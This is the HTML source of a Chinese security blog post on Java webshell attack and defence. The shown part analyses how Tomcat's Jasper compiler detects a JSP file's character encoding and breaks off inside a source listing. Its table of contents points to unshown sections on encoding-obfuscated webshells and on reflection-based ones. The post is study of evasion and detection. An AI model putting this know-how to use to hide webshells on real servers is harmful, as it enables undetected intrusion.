@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="看了YzddMr6师傅在前几年补天大会的演讲ppt、P牛的《Webshell检测那些事》以及y4tacker师傅的博客，学习一下并做记录。 环境配置Tomcat服务器选择的8.0.50，导入下面依赖。 1234567891011121314&lt;dependencies&gt;      &lt;dependency&gt;          &lt;groupId&gt;org.apache.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java-WebShell攻防学习">
+<meta property="og:url" content="http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="cmisl_破站">
+<meta property="og:description" content="看了YzddMr6师傅在前几年补天大会的演讲ppt、P牛的《Webshell检测那些事》以及y4tacker师傅的博客，学习一下并做记录。 环境配置Tomcat服务器选择的8.0.50，导入下面依赖。 1234567891011121314&lt;dependencies&gt;      &lt;dependency&gt;          &lt;groupId&gt;org.apache.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250403161146998.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250403165852380.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250403183422937.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250404012230718.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250405032519042.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250405152826825.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250406025128858.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250406030503255.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250409110746431.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250409110811746.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250409114904952.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250409112504499.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250409113142321.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250415105939029.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250415105532604.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250417010758418.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250417011034494.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250418005421467.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250417172344639.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250419160813176.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250420204558381.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250421025956853.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250421030040294.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250421034145261.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250424162652533.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250425103541874.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250425103633666.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250425103937081.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250512130823744.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250512131559084.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250512133957963.png">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250512133939855.png">
+<meta property="article:published_time" content="2025-05-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-12T05:43:38.538Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250403161146998.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java-WebShell攻防学习</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2025/05/20/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/03/27/Vite%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2025-30208%EF%BC%89/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&text=Java-WebShell攻防学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&title=Java-WebShell攻防学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&is_video=false&description=Java-WebShell攻防学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java-WebShell攻防学习&body=Check out this article: http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&title=Java-WebShell攻防学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&title=Java-WebShell攻防学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&title=Java-WebShell攻防学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&title=Java-WebShell攻防学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&name=Java-WebShell攻防学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&t=Java-WebShell攻防学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat%E8%A7%A3%E6%9E%90%E7%AF%87%E2%80%94%E2%80%94%E7%BC%96%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">Tomcat解析篇——编码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebShell"><span class="toc-number">2.1.</span> <span class="toc-text">WebShell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UTF-16BE%E7%BC%96%E7%A0%81"><span class="toc-number">2.1.1.</span> <span class="toc-text">UTF-16BE编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UTF-8-UTF-16BE-%E5%8F%8C%E7%BC%96%E7%A0%81"><span class="toc-number">2.1.2.</span> <span class="toc-text">UTF-8 + UTF-16BE 双编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#utf-16-cp037%E5%8F%8C%E7%BC%96%E7%A0%81"><span class="toc-number">2.1.3.</span> <span class="toc-text">utf-16 + cp037双编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E7%BC%96%E7%A0%81"><span class="toc-number">2.1.4.</span> <span class="toc-text">三编码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat%E8%A7%A3%E6%9E%90%E7%AF%87%E2%80%94%E2%80%94%E6%A0%87%E7%AD%BE"><span class="toc-number">3.</span> <span class="toc-text">Tomcat解析篇——标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E7%B1%BB%E7%AF%87"><span class="toc-number">4.</span> <span class="toc-text">危险类篇</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.</span> <span class="toc-text">反射方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%B1%9E%E6%80%A7"><span class="toc-number">4.2.</span> <span class="toc-text">反射属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JARSoundbankReader"><span class="toc-number">4.3.</span> <span class="toc-text">JARSoundbankReader</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-SPI%E6%9C%BA%E5%88%B6"><span class="toc-number">4.3.1.</span> <span class="toc-text">前置知识-SPI机制</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#mysql-connector-java%E4%B8%AD%E7%9A%84SPI"><span class="toc-number">4.3.1.0.1.</span> <span class="toc-text">mysql-connector-java中的SPI</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%B6%E4%BD%9CWebShell"><span class="toc-number">4.3.2.</span> <span class="toc-text">制作WebShell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JndiLoginModule"><span class="toc-number">4.4.</span> <span class="toc-text">JndiLoginModule</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AF%87"><span class="toc-number">5.</span> <span class="toc-text">表达式篇</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java-WebShell攻防学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">cmisl</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-11T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-05-12</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>看了YzddMr6师傅在前几年补天大会的演讲ppt、P牛的《Webshell检测那些事》以及y4tacker师傅的博客，学习一下并做记录。</p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>Tomcat服务器选择的8.0.50，导入下面依赖。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.50<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.50<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Tomcat解析篇——编码"><a href="#Tomcat解析篇——编码" class="headerlink" title="Tomcat解析篇——编码"></a>Tomcat解析篇——编码</h2><p>Jsp(Java Serber Pages)是一种基于Java的动态网页技术，对此不过多赘述，学习java的基本都了解。当客户端首次访问JSP页面的时候，Tomcat或者其他web容器会将其转换为Java Servlet源码(index.jsp会在Tomcat启动时解析)，编译为.class文件之后执行。后续再次访问的时候就直接使用编译后的类了。</p>
+<p>从jsp文件到字节码文件的过程中，Tomcat对于编码是如何解析的呢？我们可以从源码的角度分析。YzddMr6师傅的演讲ppt中给了一个大致的流程。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250403161146998.png"></p>
+<p><code>org.apache.jasper.compiler.ParserController#doParse</code>开始对jsp的解析，初始化了一些关于编码的标记位，方便记录一些解析的结果。</p>
+<p>接着<code>org.apache.jasper.compiler.ParserController#determineSyntaxAndEncoding</code>，这个从字面意思上看就能猜出大概得作用：确定JSP文件的语法类型(XML或传统JSP语法)和字符编码。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250403165852380.png"></p>
+<p>首先根据外部配置是否有指定xml，这种一般需要web.xml有如下配置：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp-config</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp-property-group</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">is-xml</span>&gt;</span>true<span class="tag">&lt;/<span class="name">is-xml</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jsp-property-group</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp-config</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>不过一般情况我们不会配置这个，也就是基本不会进入这个if判断，因此关注else语句里的代码，根据文件名后缀是否为<code>.jspx</code>或<code>.tagx</code>来判断要不要标记xml，如果是其中之一则标记xml。即暂定为xml格式，后续还有判断继续调整<code>isxml</code>这个标记为。如果不是上述两后缀名，就任然保持非xml。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250403183422937.png"></p>
+<p>接着就是判断是外部指定且非xml，目的是从外部配置里面获取指定的编码，外部指定和上面一样需要配置，我们不管，看else即可；首先使用XML编码检测器来自动检测文件编码，这个里面的逻辑比较复杂，稍后分析，先把后续的流程看一看。</p>
+<p>如果检测到当前标记的编码为UTF-8且非xml，就将当前编码标记设为<code>ISO-8859-1</code>，主要是为了向后兼容，不过这里设置了一个<code>revert = true</code>标记，用于表示这是一个临时回退，后续看情况对编码进行恢复：</p>
+<ul>
+<li>当检测到JSP根元素时(通过<code>hasJspRoot</code>)，会恢复为UTF-8编码，同时标记变量<code>isxml</code>为true。（eg：<code>&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;2.0&quot;&gt;</code>）</li>
+<li>当发现文件实际包含UTF-8 BOM头时(通过<code>isBomPresent</code>)，也会恢复为UTF-8编码。</li>
+</ul>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250404012230718.png"></p>
+<p>在确定JSP文件的语法类型(XML或传统JSP语法)和字符编码的过程中有一条明显的分界线，就是调用XML编码检测器，获取了编码和一些标记，比如是否存在BOM的标志位<code>isBomPresent</code>等等，这个过程就是我们刚刚暂时没有分析的地方，现在我们回头去看<code>XMLEncodingDetector.getEncoding</code>方法。</p>
+<p>获取jsp文件的输入流之后调用了重构的getEncoding方法处理。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250405032519042.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object[] getEncoding(InputStream in, ErrorDispatcher err) <span class="keyword">throws</span> IOException, JasperException &#123;</span><br><span class="line">    <span class="comment">// 初始化输入流和错误处理器</span></span><br><span class="line">    <span class="built_in">this</span>.stream = in;</span><br><span class="line">    <span class="built_in">this</span>.err = err;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建初始Reader并检测BOM头</span></span><br><span class="line">    <span class="built_in">this</span>.createInitialReader();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 扫描XML声明(&lt;?xml ... ?&gt;)获取编码信息</span></span><br><span class="line">    <span class="built_in">this</span>.scanXMLDecl();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 返回编码检测结果数组</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">        <span class="built_in">this</span>.encoding,             <span class="comment">// 最终确定的编码</span></span><br><span class="line">        <span class="built_in">this</span>.isEncodingSetInProlog, <span class="comment">// 是否在XML序言中声明</span></span><br><span class="line">        <span class="built_in">this</span>.isBomPresent,         <span class="comment">// 是否存在BOM头</span></span><br><span class="line">        <span class="built_in">this</span>.skip                  <span class="comment">// 需要跳过的BOM字节数</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先会读取输入流中的前四个字节，用于编码检测。然后用将这四个字节作为参数，使用<code>org.apache.jasper.xmlparser.XMLEncodingDetector#getEncodingName</code>方法获取编码名称和字节序信息以及BOM头、跳过字节数。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250405152826825.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object[] getEncodingName(<span class="type">byte</span>[] b4, <span class="type">int</span> count) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (count &lt; <span class="number">2</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;UTF-8&quot;</span>, <span class="literal">null</span>, Boolean.FALSE, <span class="number">0</span>&#125;;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">b0</span> <span class="operator">=</span> b4[<span class="number">0</span>] &amp; <span class="number">255</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">b1</span> <span class="operator">=</span> b4[<span class="number">1</span>] &amp; <span class="number">255</span>;  </span><br><span class="line">        <span class="keyword">if</span> (b0 == <span class="number">254</span> &amp;&amp; b1 == <span class="number">255</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;UTF-16BE&quot;</span>, Boolean.TRUE, <span class="number">2</span>&#125;;  </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b0 == <span class="number">255</span> &amp;&amp; b1 == <span class="number">254</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;UTF-16LE&quot;</span>, Boolean.FALSE, <span class="number">2</span>&#125;;  </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (count &lt; <span class="number">3</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;UTF-8&quot;</span>, <span class="literal">null</span>, Boolean.FALSE, <span class="number">0</span>&#125;;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="type">int</span> <span class="variable">b2</span> <span class="operator">=</span> b4[<span class="number">2</span>] &amp; <span class="number">255</span>;  </span><br><span class="line">            <span class="keyword">if</span> (b0 == <span class="number">239</span> &amp;&amp; b1 == <span class="number">187</span> &amp;&amp; b2 == <span class="number">191</span>) &#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;UTF-8&quot;</span>, <span class="literal">null</span>, <span class="number">3</span>&#125;;  </span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (count &lt; <span class="number">4</span>) &#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;UTF-8&quot;</span>, <span class="literal">null</span>, <span class="number">0</span>&#125;;  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="type">int</span> <span class="variable">b3</span> <span class="operator">=</span> b4[<span class="number">3</span>] &amp; <span class="number">255</span>;  </span><br><span class="line">                <span class="keyword">if</span> (b0 == <span class="number">0</span> &amp;&amp; b1 == <span class="number">0</span> &amp;&amp; b2 == <span class="number">0</span> &amp;&amp; b3 == <span class="number">60</span>) &#123;  </span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;ISO-10646-UCS-4&quot;</span>, Boolean.TRUE, <span class="number">4</span>&#125;;  </span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b0 == <span class="number">60</span> &amp;&amp; b1 == <span class="number">0</span> &amp;&amp; b2 == <span class="number">0</span> &amp;&amp; b3 == <span class="number">0</span>) &#123;  </span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;ISO-10646-UCS-4&quot;</span>, Boolean.FALSE, <span class="number">4</span>&#125;;  </span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b0 == <span class="number">0</span> &amp;&amp; b1 == <span class="number">0</span> &amp;&amp; b2 == <span class="number">60</span> &amp;&amp; b3 == <span class="number">0</span>) &#123;  </span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;ISO-10646-UCS-4&quot;</span>, <span class="literal">null</span>, <span class="number">4</span>&#125;;  </span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b0 == <span class="number">0</span> &amp;&amp; b1 == <span class="number">60</span> &amp;&amp; b2 == <span class="number">0</span> &amp;&amp; b3 == <span class="number">0</span>) &#123;  </span><br><span class="line">                    <span 